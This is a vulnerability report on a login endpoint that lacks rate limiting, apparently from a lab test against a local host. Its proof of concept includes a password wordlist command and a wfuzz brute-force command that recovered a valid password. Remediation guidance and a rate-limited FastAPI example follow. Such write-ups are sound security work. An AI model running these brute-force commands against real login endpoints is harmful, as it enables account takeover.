# Broken Authentication – Lack of Rate Limiting on Login Endpoint


## Vulnerability Overview

The application's authentication mechanism does not implement sufficient
protections against automated credential-guessing attacks. Specifically,
the login endpoint allows an unlimited number of authentication
attempts without enforcing rate limiting, account lockout policies,
CAPTCHA verification, or progressive authentication delays.

As a result, attackers can perform automated brute-force and
credential-stuffing attacks until valid credentials are discovered,
leading to unauthorized account access and potential compromise of
sensitive information.

---

## Vulnerability Classification

| Field | Value |
|---------|---------|
| Vulnerability Type | Broken Authentication |
| CWE | CWE-307: Improper Restriction of Excessive Authentication Attempts |
| OWASP Top 10 | A07:2021 – Identification and Authentication Failures |
| Severity | High |
| CVSS v3.1 | 8.1 (High) |
| Affected Endpoint | `/identity/api/auth/login` |
| HTTP Method | POST |

---

## Technical Description

The application exposes an authentication endpoint that accepts user
credentials through a JSON request body. During testing, it was observed
that the endpoint processes authentication attempts without applying any
mechanism to detect or prevent automated login attacks.

No protections such as:

- Rate limiting
- Account lockout
- IP throttling
- CAPTCHA verification
- Progressive delays

were identified during the assessment.

This allows attackers to repeatedly submit authentication requests until
valid credentials are discovered.

---

## Proof of Concept

### Step 1 – Authentication Request Analysis

The login functionality was analyzed by intercepting traffic through a
web proxy.

HTTP Request

```http
POST /identity/api/auth/login HTTP/1.1
Host: 127.0.0.1:8888
Content-Type: application/json
Content-Length: 49

{
  "email": "hacker@gmail.com",
  "password": "![[Pasted image 20260530161321.png]]"
}
```

The application accepts credentials in JSON format and returns an
authentication response when valid credentials are supplied.

![556](Attachments/Pasted%20image%2020260530125404.png)

---

### Step 2 – Password Dictionary Preparation

A custom password wordlist was generated for testing purposes.

```bash
echo -e "password123
123456
password
Qwerty4$
admin123
welcome1" > /home/kali/hunter/pass1.txt
```

---

### Step 3 – Automated Brute-Force Attack

The endpoint was targeted using `wfuzz` to automate password guessing
attempts.

```bash
wfuzz \
-d '{"email":"hacker@gmail.com","password":"FUZZ"}' \
-H 'Content-Type: application/json' \
-z file,/home/kali/hunter/pass1.txt \
-u http://127.0.0.1:8888/identity/api/auth/login \
--hc 405
```

The `FUZZ` keyword instructs the tool to iterate through all password
candidates contained in the wordlist.

![](Attachments/Pasted%20image%2020260609203021.png)

---

### Step 4 – Successful Authentication Discovery

Most invalid credentials generated the following response:

```http
HTTP/1.1 401 Unauthorized
```

When a valid password was supplied, the response changed significantly:

```http
HTTP/1.1 200 OK
Content-Length: 540

{
  "accessToken":"<JWT>",
  "refreshToken":"<TOKEN>"
}
```

Successful Credential

```text
Qwerty4$
```

The successful authentication confirms that the endpoint is vulnerable
to automated credential-guessing attacks.

---

## Impact

Successful exploitation of this vulnerability may allow attackers to:

- Compromise legitimate user accounts
- Obtain unauthorized access to sensitive information
- Perform account takeover attacks
- Access privileged functionality
- Conduct credential stuffing campaigns
- Escalate privileges through compromised accounts
- Facilitate lateral movement within the application

In environments where users reuse passwords across multiple platforms,
the impact may extend beyond the affected application.

---

## Risk Assessment

### Likelihood
High

### Impact
High

### Overall Risk
High

---

## Remediation

The authentication endpoint should implement multiple layers of defense
against automated attacks.

### Rate Limiting

Restrict the number of authentication attempts permitted within a
specific time window.

Example:

- Maximum 5 login attempts
- Per user account
- Per IP address
- Per 60-second interval

### Account Lockout

Temporarily lock user accounts after repeated authentication failures.

Example:

- Lock account after 5 failed attempts
- Lock duration of 15 minutes

### Progressive Delays

Introduce increasing response delays following repeated failed login
attempts.

### CAPTCHA Verification

Require CAPTCHA challenges after a predefined number of failed login
attempts.

### Multi-Factor Authentication (MFA)

Implement MFA for administrative and high-value accounts.

### Monitoring and Alerting

Generate alerts for:

- Brute-force attacks
- Credential stuffing attempts
- Excessive authentication failures
- Distributed login attacks

---

## Example Secure Implementation

```python
from fastapi import FastAPI, Depends
from fastapi_limiter.depends import RateLimiter

app = FastAPI()

@app.post(
    "/identity/api/auth/login",
    dependencies=[Depends(RateLimiter(times=5, seconds=60))]
)
async def login(credentials: LoginSchema):
    return auth_service.authenticate_user(credentials)
```

The implementation above limits authentication attempts to five requests
per minute, significantly reducing the effectiveness of automated
credential-guessing attacks.

---

## References

- OWASP Authentication Cheat Sheet
- OWASP Top 10 2021 – A07: Identification and Authentication Failures
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- NIST SP 800-63B Digital Identity Guidelines
- OWASP ASVS Authentication Requirements